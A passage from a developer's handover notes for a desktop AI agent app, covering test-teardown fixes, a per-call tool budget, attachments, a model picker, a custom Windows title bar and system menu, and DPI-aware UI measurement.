   full lifecycle ran (`turn.started` -> `message.started` -> deltas ->
   `message.completed` -> `turn.finished`). **What is still missing is a
   successful reply from a real hosted model**, which needs the user to raise
   or replace the OpenRouter key. See section 5 item 10. (Markdown rendering,
   section 1.6, is verified down to the token tree, the type checker and a
   served render; it still wants one look at a live transcript.)
2. **The composer's model chip and Attach button are still disabled**, and
   the `/` skills and `@` threads hints in the placeholder are not
   implemented. Either wire them or remove the hints - a placeholder that
   advertises syntax nothing handles is the same class of problem as the
   presentation-only mode pills were.
3. **The Files tree has no grouping.** Paths are a flat list; a real tree
   wants directory rows. The `TreeEntry.kind` field already carries `"dir"`
   and the collapse logic is written, so this is a change to how entries are
   built in `App.tsx`, not new infrastructure.

### 7.2 Not blocked — do these any time

- `read_file` offset/limit
- `edit_file` `replace_all`
- unify timeout units on `timeout_ms`
- `http_request` / `fetch_url` file download
- a "list definitions" tool
- single-source the tool schema/registry
- per-turn output budget
- reset browser page state between runs
- **finish the chat bubble width fix** (see section 8)

---

## 8. Known incomplete work

**Tkinter chat bubbles are still full-width.** The intent was for them to hug
their text, but `grid_columnconfigure(0, weight=0)` on the customtkinter frame
did not achieve it. The wraplength calculation (`_bubble_wrap_width`) works, the
width does not. Fix by measuring (`winfo_reqwidth`) rather than assuming the
grid respects weight, and **verify by screenshot** — the previous attempt
"passed" tests that never checked pixels.

Note this is a **Tkinter-only** problem. The React UI gets it right with
`width: fit-content` and needs no measurement: a short bubble measured 95 px
inside a 1152 px column. If the Tkinter UI is ever retired, this item goes with
it. See section 3.

**`test_phase4_ux.py` was flaky as a file. Root cause found, fixed.**

The signature was always the same and always misleading: a *different* test in
the file failed each time (`test_key_hint_and_forget_button_do_not_overlap`,
`test_collapsible_sections_toggle_without_error`,
`test_ghost_buttons_are_transparent_not_white`,
`test_key_entry_is_empty_not_prefilled`), always with
`invalid command name "tcl_findLibrary"` from `ctk.CTk()`, always passing in
isolation and on immediate re-run. A test that fails only in company and
never alone is a state problem, and earlier notes here blamed a broken Tcl
install. That was wrong.

`real_window` built a real `ctk.CTk()` root per test and destroyed it in a
`finally`. `MainWindow` schedules `root.after(500, self._start_sandbox)` and a
sandbox poll that reschedules *itself* every 5s, plus CustomTkinter schedules
its own `after` for the Windows titlebar icon. Those are interpreter commands,
so destroying the root left them queued against a finalised Tcl, and whether
the next `Tk()` in the same process then succeeded was a race -- so the failure
landed on whichever test happened to run next. The way to see the mechanism
without a test run:

```
python -c "import customtkinter as ctk
for i in range(8):
    r = ctk.CTk(); r.withdraw(); r.update_idletasks(); r.destroy()"
```

Eight clean create/destroy cycles, and stderr still prints
`invalid command name "..._windows_set_titlebar_icon" ... while executing ...
("after" script)`. The callbacks outlive the root; only the *consequence* is
nondeterministic.

The fix keeps one interpreter for the module and gives each test only its own
widgets: a lazy `_tk_root()` singleton, a module-scoped autouse fixture that
finalises it at the end, and a `_cancel_pending_after()` helper that drains
`root.after_info()` after every test. Cancelling matters as much as sharing --
without it the 5-second self-rescheduling poll would keep firing against
destroyed widgets. The lazy singleton rather than a fixture argument is
deliberate: `real_window` is a `@contextmanager` the tests call directly, so
pytest cannot inject anything into it.

Verified after the change: 4/4 `pytest tests -q` (244 passed), 6/6 file runs,
and 15/15 consecutive runs of the two tests that used to be the usual
casualties. The general lesson for the rest of the suite: **a Tk test that
fails only in a full run is a teardown problem until proven otherwise**, and
creating and destroying a Tk root per test is the thing to stop doing.

**`test_chat_path_streams_end_to_end[groq]` no longer needs a key.** It used
to fail with `The groq key does not start with 'gsk_'` because Phase 2
overwrote the real key while hand-testing `key.save`. The test stubs the HTTP
transport rather than reading the keyring, so it passes for all four providers
now. The *missing key itself* is still an environment gap, but it is no
longer a test failure -- do not go looking for a bug here.

**`RuntimeWarning: coroutine ... was never awaited`** in
`tests/unit/test_tool_sandbox_routing.py:875` — two occurrences, pre-existing.

---

## 9. Decisions made, and why

- **Keep the Python core, replace only the UI.** A survey of comparable
  projects found the closest precedent is Goose (Block): a native core plus a
  TypeScript UI. A full core rewrite would discard 238 tests and 22 tools.
- **JSONL over stdio, not a local HTTP server.** Tauri owns the sidecar
  lifecycle, so it starts and dies with the app. No port to collide with, no
  auth, no CORS, and a dead pipe is an unambiguous failure signal.
- **Events plus request/reply, not one or the other.** The UI must both ask
  questions and receive unsolicited progress.
- **Exact per-provider `key_length`.** A prefix check plus a 20-char floor let
  a truncated key through and produced a baffling server-side error.
- **Injectable transport in the TS client.** Keeps the protocol verifiable
  without the build toolchain, and keeps Tauri out of the business logic.
- **The frontend asks the core what exists; it never hardcodes a list.**
  `providers.list` and `mode.list` exist so provider names and mode labels
  cannot drift from the registries behind them. Both were worth it: the
  mode test immediately caught `http_request` being in no allow-list.
- **Search delegates to the agent's grep rather than scanning again.** Two
  scanners means two sets of skip rules and path confinement, and the search
  a user runs slowly stops matching the search the agent runs.
- **A mode is a permission, not a prompt.** Enforced in the orchestrator
  before argument validation and before the confirmation dialog, because a
  prompt produces a model that claims compliance and then writes the file.
- **No protocol method returns a secret.** There is no `key.get`, and a test
  fails if one is added. A method that returns a secret is a method whose
  secret can reach a screenshot.
- **Self-hosted fonts.** The system stack renders differently per machine,
  which defeats the point of tuning a desktop layout.

### The composer pass: send icon, attachments, model picker, tool budget

Four features that were all "coming soon" placeholders. Committed one each:
`698b022`, the tool budget, the model picker, and the attachments.

**What was actually missing was usually smaller than the label.** The model
chip said "Model -- coming soon" but `api/client.py` already had `list_models()`
and the dialect already knew the `/models` URL. The only thing absent was an
RPC to call it through. The tool cap existed as `MAX_TOOL_ROUNDS = 6` -- so
there was no gap in the feature, only in the unit.

#### The tool-call budget counted the wrong thing

`MAX_TOOL_ROUNDS` counted assistant *passes*. A model asking for five tools in
one message spent one round, so it could run thirty tools for the price of six:
a bound that read like a bound and bounded nothing. It now counts individual
calls, and every tool result carries `tool_call_budget` -- the same field the
model reads and the card draws, so the two cannot disagree.

Three things that are easy to get wrong here, and one of them bites late:

- **A refused call is still answered.** The assistant message above already
  declared it in `tool_calls`, and an OpenAI-compatible endpoint rejects a
  declared call with no matching result. Dropping the refused ones turns a
  finished turn into a 400 on the *next* message, with the cause one request
  removed from anything visible.
- **A failing tool still spends a call.** Counting only successes would make a
  loop of failures free.
- **A spent budget does not end the turn; a refusal does.** The model still
  gets one more pass to answer from the result it has. A test asserting the
  opposite looked like a bug and was right to be corrected: a model that cannot
  answer at all is not a saving.
- **The loop needs a round backstop as well.** A call whose `function.name` is
  empty is skipped without being counted, so a malformed gateway would spin
  forever without ever spending a call. That is a hang, not a slow turn.
  `MAX_TOOL_ROUNDS = 100` is now that backstop, not the primary limit.

#### The type change that would have broken token estimation quietly

`ChatMessage.content` is now `str | list[dict] | None` so attachments can be
content parts. `estimate_tokens` was `len(m.content or "")`, which counts
*characters* for a string and *parts* for a list -- so a 4000-character document
attached as three parts estimated at **zero** tokens. Nothing crashed; the
budget simply stopped counting. Worth remembering as a class: a `len()` over a
field that just became a union is the failure mode with no stack trace.

Same shape of trap on the way back out: a saved message with an attachment
reads back as content parts, and handing that array to a component expecting a
string renders `[object Object]` in the user's own history. `textFromContent`
in `app/src/attachments.ts` is the only place that knows this.

#### Attachments

The bytes go *in* the message, not a path *beside* it -- so the model sees a
screenshot rather than being told one exists. `Dialect.build_request` passes
messages through verbatim, which is why no dialect changed and why
`test_attachments.py` asserts that it still does.

The picker is `<input type="file">` + `FileReader`, not the native dialog in
`dialog.ts`. That dialog is for folders and stays that way: it hands back a
path because the core gives one to the sandbox, and this needs the bytes. The
alternative (a new `#[tauri::command]` reading files) costs a Rust build, a
capability, and a `base64` dependency for no user-visible difference.

Validation is in the core, not the window. The window is a rendering layer and
not a trust boundary; the limits are mirrored in the frontend only so a user
finds out before a multi-megabyte read. PDFs are refused *with a next step*
rather than converted -- the endpoint takes no document part, and a PDF made of
text is usually not what someone attaching one wanted.

A message with files and no words is a message. "What is in this screenshot?"
has no text in it, and requiring text would make the obvious use of the feature
the one thing it cannot do.

#### Model picker

`models.list` returns the provider's own list, sorted, plus `current` so the
menu ticks the bound model without guessing. An empty list is an **error**, not
an empty menu: "the provider has no models" and "we could not ask it" are the
same pixels, and only the second is fixable by the user checking their key.

Switching is refused mid-turn. The turn's history is being written by one model
and rebinding interleaves two models' answers into one conversation.

`/models` is now cached per client. It was fetched twice -- once for the ids,
once for the reasoning metadata -- and two responses are not guaranteed to
agree about which models exist.

#### Live verification

`verify_composer_pass.py` read the packaged app's DOM over CDP. It
found **462 models** in the real OpenRouter list, a filter, five budget
presets, an enabled attach button with a real hidden input behind it, and a
send button that is an icon labelled "Send" with no "Continue" anywhere in the
row. Zero console errors.

Not verified live, deliberately: switching a model or changing the budget
rewrites the user's `config.toml`, so both are proven by unit tests instead.

#### Traps hit while doing this

- **Overwrote a source file with a patch script.** `write_file` aimed at
  `src/tonyagent/providers/base.py` when the content was a Python patcher, so
  the real file was replaced by the script that was going to edit it. Caught by
  `git status`, restored with `git checkout --`. Patch scripts go in
  `scripts/`, always.
- **A destructured getter reads once.** The model picker harness returned
  `loads` as a getter on an object literal, and `const { loads } = harness`
  evaluated it *at the destructure* -- so every assertion after a click read the
  number from before it. It looked exactly like the component failing to load.
  Counts in a harness are functions, not values.
- **A state update during render.** `ToolBudgetControl` derived `shown` with
  `useState` + `if (value !== shown) setShown(value)`. The render loop took the
  suite from 4s to 121s and died with `RangeError: Array buffer allocation
  failed`. Reading the prop directly was the fix; the derived state was never
  needed.
- **jsdom has no `DataTransfer` and no assignable `input.files`.** The file
  input tests stand in a FileList-shaped object. And `FileReader` was missing
  from `test-dom.ts`'s global list, so every attachment test failed with
  "FileReader is not defined" -- which reads like a broken feature rather than
  a missing harness global. It is listed now.
- **A CSS line with literal `\n` in it.** A patch string with an unescaped
  newline glued two selectors onto one line and the build failed on
  "Unclosed block". Fixed by line index rather than by string match, because
  the file was CRLF and that one line was not -- so any multi-line anchor built
  from `\r\n` missed it.
- **`audit_reduced_motion.py` earned its keep twice.** Both new surfaces
  (`.budget-popover`, `.modelpicker`) needed their cancellation written as
  `.thing[data-state="open"]` rather than `.thing`; the one-class form loses on
  specificity and the motion keeps playing. It flagged both before they shipped.
- **The `ModelPicker` fetch guard is load-bearing and does not look it.**
  The effect depends on `onLoad`, which is an inline arrow in every caller, so
  removing the `loaded` ref makes the effect call `onLoad`, re-render, get a
  new arrow, and run again forever. The mutation test did not fail -- the test
  run never finished.

### The second UI pass: the popovers, the limit, and the window's own title bar

Four things a person reported, committed in two: `16edd40` (the popovers and the
typed limit) and `08b3bfb` (the title bar and the rail). Both are measured, not
asserted — see "Live verification" below.

#### The popovers closed on the press that reached them

`ModelPicker`, `ToolBudgetControl` and `ConversationList`'s row menu each closed
on a `pointerdown` they listened for during the **capture** phase, and did not
check where the press landed. Capture runs before the DOM has any say, so
clicking the model filter — the one thing the menu exists for — closed the menu
on the way in, and the list was unreachable. Reading as "the control is broken".

The rule now lives once, in [useDismiss.ts](app/src/useDismiss.ts), and asks the
only question that matters: **is the press inside the surface?** Three copies of
the listener were how the three drifted into agreeing with each other and not
with the fix; a fourth surface would have been a fourth copy.

The ref that goes with it is the *wrapper*, not the panel. The model chip and
the budget button live inside the wrapper, so ref-ing the panel would classify
a press on the chip as an outside press and close the menu on the same click
that opened it.

#### A limit you can type

The budget offered 3/5/10/20/50 and nothing else, so a turn that wants 40 calls
had no way to ask for one. The presets stay; beside them is a field, prefilled
with the core's own value, `1`–`200`, applying on Enter or on the `Set` button.

`parseBudget` is a pure exported function and it **refuses rather than clamps**,
including while you are still typing — a field that rewrites "1" to "0" under
the cursor is worse than one that says no. `Number`, not `parseInt`, so `12abc`
is a refusal and not a silently accepted 12. A refusal renders *inside the
popover*, next to the field, with `role="alert"`: the window's error banner is
several hundred pixels from the person who just pressed Enter, and it persists
long after they have looked at the field again.

#### The window draws its own title bar

`decorations: false` and `shadow: false` in `tauri.conf.json`, and three SVG
buttons in `TopBar`. What that required, all of it silent otherwise:

- **`core:window:default` is getters only** (plus
  `allow-internal-toggle-maximize`). `minimize`, `toggle_maximize`, `close` and
  `start_dragging` each need their own entry in `capabilities/default.json`, or
  the caption is three dead buttons that log to the console and a window that
  cannot be moved. `verify_pass_b.py` proved them by toggling the window,
  checking it changed, and toggling it back.
- **`data-tauri-drag-region="deep"`**, not `"true"`. Bare and `"true"` fire only
  on a *direct* press, which in practice means the empty pixels; `"deep"` covers
  the subtree, so a press on the tab pill's padding moves the window. Clickable
  elements (`BUTTON`, `INPUT`, …) still swallow it unless they carry the
  attribute themselves. The implementation is
  `tauri-2.12.0/src/window/scripts/drag.js`.
- **`.topbar` had to leave `.main`.** It is now the first child of `.app` and
  spans `grid-column: 1 / -1`, so the caption sits at the right edge of the
  *window* rather than of the transcript column — the Files panel overlays that
  column, and a caption inside it is covered the moment the panel opens. `.app`
  is a two-row grid and **every in-flow child names `grid-row: 2` explicitly**:
  with auto-placement a build that renders no Files panel would push the rail
  into the title bar's row and render the whole window 42px lower.
  `.sidebar`/`.sidebar-scrim` start at `top: var(--topbar-h)`, so the panel
  overlays the transcript and never the caption.

#### The reopen button was against the window edge

`.rail-toggle` carried `align-self: flex-start`, overriding the rail's
`align-items: center` in *both* states. Expanded it bought nothing —
`.rail-expanded .rail-btn` is `width: 100%` there, so cross-axis placement is
invisible — and collapsed it put the one control that brings the sidebar back at
x=0 while every other icon sat at x=16. The fix narrows the rule to
`.rail.rail-expanded .rail-toggle { align-self: stretch }`.

> **Superseded.** There is no expanded rail any more — see "The rail became a
> strip" below. The rail is a fixed-width column at every width (56px since the
> density pass; it was 52px when that note was written), so both that rule
> and `.rail.rail-expanded .rail-btn` went with it, and the toggle's fix is now
> simply *not* declaring a cross-axis placement of its own. The test asserts the
> absence, because any value there reintroduces the misalignment and only the
> rail's own centring gets it right.

This is the kind of bug a screenshot catches and a stylesheet test does not:
nothing in the CSS is wrong on its own, it is the cascade. Hence
[layout.test.ts](app/src/layout.test.ts) reads resolved rules rather than
matching text.

#### Live verification

`verify_pass_b.py` — six CDP probes against the packaged app, because
three of the four fixes are facts about the *shipped window* and no unit test can
see them:

```
rail_collapsed_alignment   {"railWidth":70,"lefts":[16],"aligned":true}
title_bar_is_ours          {"dragRegion":"deep",0..1200,"buttons":[3 correct labels, all drawn]}
window_is_undecorated      {"decorated":false}
caption_commands_are_permitted  {"before":false,"after":true,"restored":false}
budget_free_field          prefilled "10"; 0 refused in place, popover still open, nothing applied
pressing_the_model_filter_keeps_the_menu  {"state":"open"}
```

Build and run it with the app **not** already running:

```bash
cmd //c ".\Build TONYAgent.bat" /q > /tmp/build.log 2>&1 &   # ~4 min; poll
taskkill //IM tonyagent-app.exe //F && taskkill //IM msedgewebview2.exe //F
(WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=--remote-debugging-port=9333 \
  ./app/src-tauri/target/release/tonyagent-app.exe > /tmp/app.log 2>&1 &) ; sleep 28
# The two verifiers for that pass are gone; their findings are the
# paragraphs above. To re-measure any of it now, launch the packaged app with
# WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=--remote-debugging-port=9333 and drive
# scripts/probe_webview.py.
```

`mutate_pass_b.py` put each of the four defects back and required at
least one test to go red, then restores every file — the only honest check on a
regression test. Current result: all four caught (the dismissal rule by 8 tests,
the rail and the drag region by `layout.test.ts`/`TopBar.test.tsx`, the clamped
budget by the refusal test).

#### Traps hit while doing this

- **A build fails with `PermissionDenied` at `tauri-build` `lib.rs:164` if the
  app is still running.** The binary is locked. `taskkill` both
  `tonyagent-app.exe` and `msedgewebview2.exe` *before* starting a build, not
  when it fails.
- **Two of the two verifiers touch the model chip.** `verify_pass_b.py` left
  the model menu open; `verify_composer_pass.py` pressed the chip to toggle it,
  and then fails `send_is_icon`/`model_menu` for reasons that have nothing to do
  with the code under test. Run `location.reload()` in the CDP target between
  them.
- **A filename that differs only in case.** `windowControls.ts` next to
  `WindowControls.tsx` is TS1149/TS1261 on Windows and passes anywhere else. The
  hook is `useWindowControls.ts`.
- **CRLF is not uniform.** `app/src/styles.css` and `app/src/backend.ts` are
  CRLF; most of `app/src/*.tsx` are LF. A patch anchored on `\r\n` silently
  misses a file that is LF, and a patch that writes LF into a CRLF file shows up
  later as a whole-file diff.
- **Nested triple quotes inside `python -c` heredocs break.** One-shot patchers
  go in `scripts/_something.py`, get deleted afterwards, and are never staged.

#### The system menu, and the three things that were not markup

`decorations: false` took more than the bar. It took the menu on Alt+Space, the
menu on a right-click, and **Move and Size** — and the last two are drag loops
the OS runs, so a window without them cannot be placed or resized at all. No
React component stands in for that.

The window still carries `WS_SYSMENU`: tao keeps the window style and only tells
`WM_NCCALCSIZE` that the client area is the whole window (`to_window_styles`
keeps `WS_CAPTION | WS_THICKFRAME | WS_SYSMENU`; only
`to_adjusted_window_styles` clears the first two, and that one is for sizing).
**So `decorations: false` does not cost Aero Snap or the resize borders** — the
obvious fear, and the thing to check in `to_window_styles` before assuming it.
The OS is already holding the right menu, so the app asks for it —
[`system_menu.rs`](app/src-tauri/src/system_menu.rs), one command, one Win32 call:

```rust
let hmenu = GetSystemMenu(hwnd.0, 0);
GetCursorPos(&mut at);
let chosen = TrackPopupMenu(hmenu, TPM_LEFTALIGN | TPM_TOPALIGN | TPM_RIGHTBUTTON
                                 | TPM_RETURNCMD, at.x, at.y, 0, hwnd.0, null());
if chosen > 0 { PostMessageW(hwnd.0, WM_SYSCOMMAND, chosen as usize, 0); }
```

`TPM_RETURNCMD` so the chosen item comes back as a value and the window's own
message loop acts on it, which is what happens when a user clicks the menu.
`TrackPopupMenu` blocks, because a menu is a modal loop — the webview is another
process, so the app keeps painting.

**`WM_SYSCOMMAND` + `SC_KEYMENU` does not work here.** It is the message the OS
sends itself for Alt+Space and the obvious way in; posted at this window from
outside the app, with no IPC in the way, it produces nothing. A frameless tao
window does not pass it to `DefWindowProc`.

**Alt+Space is not bound.** On this machine it is a global hotkey (Copilot): the
OS consumes it before any window sees it, so a binding would be a line of code
that can never run. `F10` is the other name Windows has for the same menu.
Measured, by recording what reaches the page with the app in front:

| key | reaches the page |
|---|---|
| **F10** | **yes** (and `defaultPrevented: true`, so the handler ran) |
| F9, F11, M, Space, Escape | no — WebView2 keeps them |
| Alt+M | yes (`key` `Alt`, then `m`) |

Note WebView2 reports **`event.code === ""`**, so a hook that reads only `code`
sees nothing. `useWindowControls` accepts `code` or `key`.

#### The app's own command needs a name in three places

An app command is ACL-checked whenever the app ships a capability file, which
this one does. Three names have to agree, and a typo in any of them is a menu
that never opens with the reason only in the console:

- the command, `show_system_menu` in `lib.rs` (`#[cfg(windows)]`, so the
  `generate_handler!` is behind a `cfg` too);
- `tauri_build::AppManifest::new().commands(&["show_system_menu"])` in
  `build.rs`, which writes `permissions/autogenerated/show_system_menu.toml`
  (gitignored — it is a build product);
- `allow-show-system-menu` in `capabilities/default.json` — **dashes**, because
  the identifier slugifies the command's underscores.

`windows-sys 0.61` goes in under `[target.'cfg(windows)'.dependencies]` with
`Win32_Foundation` (for `POINT`) and `Win32_UI_WindowsAndMessaging`. It is the
version tauri already resolves, so this adds a feature, not a second crate.

#### Reading a menu off the screen (three ways to get it wrong)

`scripts/verify_system_menu.py` drives the packaged app with real input and
finds the menu as a visible top-level window of class `#32768`. Getting there
took three corrections, each of which had the verifier confidently reporting "no
menu" for a menu that was plainly on screen:

1. **Not by `GW_OWNER`.** The app's own system menu reads owner **0**. The menu
   window is created by the thread that called `TrackPopupMenu`, so the honest
   discriminator is the **process**: the app's pid for this menu,
   `msedgewebview2.exe`'s for the webview's context menu.
2. **The menu stays where you left it.** A menu the verifier failed to
   recognise stays open, covers the title bar, and swallows the next
   right-click — which then reports the menu as missing. `EndMenu` to dismiss
   (Escape goes to whatever has the focus, and a menu is not it), and `EndMenu`
   again in the `finally` so a run that dies mid-case cannot leave one over the
   user's desktop.
3. **Seven items, not six, and the greyed-out rule is the opposite of what it
   looks like.** There is a separator at index 5, and the item that is *off* is
   the one that would do nothing: **Restore** greyed on a normal window,
   **Maximize** greyed on a maximized one. Labels are localised and carry their
   mnemonics (`&Move`, `Mi&nimize`, `&Close\tAlt+F4`), so assert by **position**
   and read `maximized` from the window's own `WS_MAXIMIZE` — never from how big
   the window looks. (This window is dragged out past its work area and is *not*
   maximized by the style's account, and the menu agrees with the style.)

The cases that justify the feature: `move` and `size` are driven from the
keyboard — F10, the mnemonic, six arrow presses, Enter — and the rectangle
before and after is compared, then the window is put back with `SetWindowPos`.
Both pass. `WS_MAXIMIZE` is `0x01000000`; `0x00010000` is `WS_MAXIMIZEBOX` and
reading that instead is how a normal window gets reported as maximized.

#### Being a guest on someone's desktop

The verifier takes the focus (F10 needs it) and moves the pointer, so it puts
both back: `SetForegroundWindow` to whatever was in front, `SetCursorPos` to
where the cursor was, in a `finally`. It does not move or resize the window
except in the Move/Size cases, which restore the original rectangle. It measures
the title bar from `--topbar-h` × the monitor's DPI rather than assuming
(42 CSS px is 74 physical px on the 175% display the app was tested on), and it
runs the keyboard case **first**, because a right-click off the title bar leaves
the webview's context menu open with the input captured, and the F10 after it
goes to that menu instead of the app.

---

## Measuring the reference (third UI pass)

The palette and every length in `app/src/styles.css` are measurements, and this
is the pass that made them correct ones. Four traps, in the order they cost time.

### 1. A screenshot taken at logical pixels is worse than no screenshot

The display is at 1.75 scale. `CopyFromScreen` from a DPI-unaware process takes
and returns **logical** pixels, so the first pass measured a 1655x990 image and
recorded a 425px sidebar and a 42px title bar. The real window is 2879x1799
physical: the rail is 52px, the list column 255px, the bar 48px, the composer
720px. Every figure was wrong by the same factor, which is what made them look
*consistent* — the accent had come out right, so nothing looked broken.

`scripts/shot_screen.ps1` now calls `SetProcessDpiAwarenessContext(-4)`
(PER_MONITOR_AWARE_V2) before any GDI call and reports 2880x1800. The
`Freebuff` window is 1655x990 **CSS**, 2896x1732 physical.

Sanity check that costs nothing: 2879 / 1.75 = 1645 logical, and the second
monitor's work area is 1646 wide. If a capture does not divide down to the
monitor, it was taken at the wrong scale and every number from it is wrong.

### 2. A run is reported in the colour of its *first* pixel

`runs_of` merges neighbouring pixels within a tolerance so antialiased text does
not shatter a row into hundreds of slivers. The cost is that a wide run
beginning on a hairline border reports the **border's** colour, not the fill's.
This reported the tab pill as `#40423e` and the send button as `#beccac`, both of
which are one step off the truth. Sample a 3x3 patch when the answer matters.

### 3. A capture at the wrong origin reads as a layout measurement

Passing the monitor's *logical* origin to a DPI-aware `CopyFromScreen` captures
mostly black with a sliver of window in it, and that sliver looks exactly like a
narrow window. `scripts/window_rect.ps1` prints the real rectangle of a process's
windows in physical pixels, which is what the capture arguments should be. Note
`$pid` is read-only in PowerShell and `$using:` does not reach an
`EnumWindows` delegate — both throw before the callback ever runs, and the
script then reports "no windows" rather than an error.

### 4. The paste pipeline shifts the accent. Do not "fix" it.

The screenshots sent into the thread render TONYAgent's send button as
`#beccac`. It is `#bacda9`. Confirmed three ways: the live document computes
`rgb(186, 205, 169)` with no filter, blend or opacity anywhere in the ancestor
chain; a self-taken capture at full DPI finds 2436 pixels of exact `#bacda9` and
**zero** of `#beccac`; and the same pipeline leaves Freebuff's own `#bacda9`
exact. It is a property of how one window's screenshot was transcribed, not of
the app. The declaration is correct — leave it alone.

Also note the bright blue `#2e6ee8` and the red `#7f434a` in a TONYAgent
screenshot are **taskbar** pixels below y=1718, not the app's. A full-screen
capture includes the desktop; bound the search to the window or the histogram
will blame Windows for the palette.

---

## The fourth UI pass

Three changes, two of them inseparable. The corner radius is one Win32 call; the
overlay is a layout change that happens to be the *only* way the panel could be
animated at all.

### Rounded corners are a window attribute, not a radius

`decorations: false` took the title bar away, and with it the rounded corners
Windows 11 was drawing around the window. They come back with
`DwmSetWindowAttribute(hwnd, DWMWA_WINDOW_CORNER_PREFERENCE, DWMWCP_ROUND)` —
`app/src-tauri/src/window_corners.rs`, called once from `run()`'s `setup` hook.

**Why not a CSS `border-radius` on `body`.** The corner outside the radius shows
whatever is *behind* the window, so a radius is only visible through a
transparent window. Making the window transparent to get there is not free: it
puts the whole window on the layered path, where the drop shadow, the resize
borders and DWM's own corner masking all behave differently — and `WS_THICKFRAME`
is the reason the window still snaps and resizes (see `system_menu.rs`). Asking
DWM keeps an ordinary opaque window.

**Why it is not a command.** The system menu is a command because a *person*
asks for it. Nothing in the UI ever wants a different corner shape, so the
plumbing would exist only to let the frontend set a constant. Doing it in
`setup` also means it cannot be skipped by a frontend that fails to load, and it
needs no entry in `build.rs` or `capabilities/default.json`. A failure is logged
and ignored: the realistic failure is a Windows build that does not know the
attribute, which is cosmetic and not a reason to refuse to open the window.

Verified two ways. Read the attribute back off the live window —
`DwmGetWindowAttribute(hwnd, 33)` returns `hr = S_OK` and value `2`
(`DWMWCP_ROUND`), with `IsZoomed` false — and then confirmed the pixels, which
the user checked visually.

**A trap if you try to measure the corner yourself.** The pixels at the window's
origin are a gradient (`#09090a` → `#101011` → `#1e1e1f` → `#343435` over about
10px), not a clean edge, and that is **not** the radius. It is the invisible
resize border: tao keeps `WS_THICKFRAME` on an undecorated window, so
`GetWindowRect` includes a border the user cannot see and cannot click. Any
"first window pixel along the edge" measurement therefore lands on the border's
blend and reports ~5px regardless of what the corner is doing. Measure against
`DwmGetWindowAttribute(DWMWA_EXTENDED_FRAME_BOUNDS)` — the rectangle of the
*visible* frame — or just look at it, which is what settled it.

### The conversation list is an overlay, and that is why it can animate

`.sidecol` is gone. The rail is column 1 on its own, and `.chatlist` is an
absolutely positioned panel at `left: var(--rail-w)` and `top: var(--topbar-h)`,
floating over the transcript with a shadow, `--list-w` wide (260px today).

The animation and the layout fix are the same change, which is the whole reason
to do it this way:

- **A grid track cannot be transitioned.** The old `.app.rail-open` widened
  column 1 from the rail's width to the sum of the rail and the list. That is a *layout* change: the transcript
  re-wrapped on every intermediate frame and the track itself snapped, which is
  why the previous rail comment said no width transition was used — the rail
  would have slid inside a track that had already moved.
- **Floating it means only a `transform` moves**, and a transform is the one
  property that can animate without the layout underneath being recomputed.

`--rail-w-expanded: 307px` became `--list-w`, so no token is the sum of two
widths any more. **Superseded:** the panel is 260px and the rail 56px, so the
sum from the window's left edge to the panel's right edge is 316 and no longer
matches anything.

Two consequences worth knowing:

- **`.app.rail-open` no longer exists and no rule reads it.** React still sets
  `railExpanded`, but it now only feeds the panel's `data-state` and the rail
  toggle's icon/label/`aria-expanded`. `layout.test.ts` asserts the absence, so
  a rule reintroducing it fails rather than silently un-floating the panel.
- **`.app.rail-open .topbar` had to go too, and deliberately.** The panel starts
  *below* the title bar — for the same reason `.sidebar` does, so the caption
  buttons and the drag region stay reachable — so the bar's left region is
  always exactly the rail. An indent that tracked the panel would put the tab
  the panel's own width right of the panel's left edge with nothing underneath it.

Verified live over CDP: rail `52 × 752` at `(0,48)`, `.chatlist` `255 × 752` at
`(52,48)`, `position: absolute`, and **`.main` still 1114px wide with the panel
open** — which is the whole point. 30ms after closing, the node is still in the
tree with `data-state="closed"`, `pointer-events: none` and `slide-out-left`
running; it unmounts after the exit.

### The panel has no scrim, unlike the Files panel

Worth recording because it looks like an inconsistency and is not. The Files
panel is a temporary thing you look at and dismiss, so dimming the window behind
it is honest. The conversation panel is navigation you keep open while you read
and write — a scrim over the transcript would be dimming the surface the panel
exists to get out of the way of. A drop shadow carries the same "this is on top
of that" information without the cost.

Escape closes both overlays now (one `keydown` listener in `App.tsx`, files
first). `useDismiss` is the wrong tool here: it dismisses on a press *outside*
the surface, and a full-height overlay has no meaningful inside to protect — a
press on the transcript is a press the user may well have meant for the
transcript.

### Opening a conversation closes the panel, and moves the caret with it

Picking a row (or pressing **New chat**) closes the panel. It is an overlay
that would otherwise sit on top of the conversation just chosen, which is the
opposite of what it is for.

**The non-obvious half is the focus.** The press landed on a row *inside* the
panel, and the panel is about to leave the document. Delete the focused element
and focus falls back to `<body>`, so the next Tab restarts from the top of the
window — a keyboard user switching conversations would walk past the title bar,
the rail and the whole panel every single time. So `closePanelToComposer` also
puts the caret in the composer textarea, which is what one does *next* with a
conversation.

Three details that are load-bearing:

- **The panel is not closed by the list.** `ConversationList` fires `onOpen` and
  leaves closing to `App.tsx`. A list that unmounted itself would have no box
  left for the exit animation — the close would be a cut. The test asserts the
  panel is still there, still `open`, after the click.
- **Focus is moved in `requestAnimationFrame`.** The panel does not leave
  synchronously (`useDelayedUnmount` holds it for the exit), and focusing an
  element while something overlapping it is still on its way out scrolls the
  departing panel back into view.
- **`Composer` takes an optional `inputRef`.** Focus belongs to the window, not
  to the composer — but the composer still owns the element. The ref is
  optional, so the settings preview and any future embed are unaffected.

**Not unit-tested at the `App.tsx` level, and that is a real gap.** `App.tsx`
constructs `new TauriBackend()` in a ref with no injection seam, so rendering it
in a test would spawn a real sidecar. The two component-level halves are pinned
instead (`onOpen` fires without self-closing; the ref lands on the textarea) and
the wiring was verified live over CDP. Adding a backend prop to `App` would
close the gap and is worth doing on its own.

Verified live: after a row click, 60ms in, the panel is still mounted with
`data-state="closed"` and `pointer-events: none`; after the exit it is gone,
`.main` is back to 1114px, and `document.activeElement` is the composer textarea
— not `<body>`.

### That gap is now closed: `App` takes a backend

`App({ backend })` takes an optional `TauriBackend`, defaulting to the real one.
The window is now renderable in jsdom — see `App.test.tsx`, which covers the
whole composition for the first time.

**The prop is the concrete `TauriBackend`, not an interface.** Declaring a
`Backend` interface was the obvious move and the wrong one: it would be a second
statement of the protocol, and this file's own module comment records what that
costs. `TauriBackend`'s constructor already takes a transport factory, so a test
supplies the *bytes* and the real framing, request ids, reply routing and error
handling still run underneath. The protocol is verified once and the window is
verified on top of it.

**Two things it cost, both worth knowing.**

1. **Every import in the module graph now carries `.js`.** Node's ESM resolver
   will not guess, so `App.tsx` could not be loaded at all until its 19
